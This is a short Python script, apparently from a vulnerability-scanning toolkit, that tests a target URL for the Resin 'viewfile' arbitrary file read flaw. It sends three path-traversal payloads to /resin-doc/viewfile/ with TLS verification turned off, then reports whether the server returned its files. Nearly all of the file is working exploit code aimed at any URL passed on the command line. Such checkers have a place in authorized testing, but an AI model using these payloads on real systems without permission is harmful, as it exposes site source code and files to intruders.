#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: resin viewfile 任意文件读取
referer: http://www.securityfocus.com/archive/1/434145
author: Lucifer
description: When resin-doc is installed on a system it is possible to read all files
contained within the web root including class files which can then be
decompiled to view the Java source。
'''
import sys
import requests
import warnings


class resin_viewfile_fileread_BaseVerify:
    def __init__(self, url):
        self.url = url

    def run(self):
        result = ['resin viewfile 任意文件读取', '', '']
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payloads = ["/resin-doc/viewfile/?file=index.jsp", 
                    "/resin-doc/viewfile/?contextpath=/.\../&servletpath=&file=index.jsp",
                    "/resin-doc/viewfile/?contextpath=/.&servletpath=&file=index.jsp"]

        try:
            noexist = True
            for payload in payloads:
                vulnurl = self.url + payload
                req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
                if r"resin-doc" in req.text and r"caucho.server" in req.text:
                    result[2] = '存在'
                    result[1] =vulnurl
                    noexist = False
            if noexist:
                result[2] = '不存在'

        except:
            result[2] = '不存在'
        return result

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = resin_viewfile_fileread_BaseVerify(sys.argv[1])
    testVuln.run()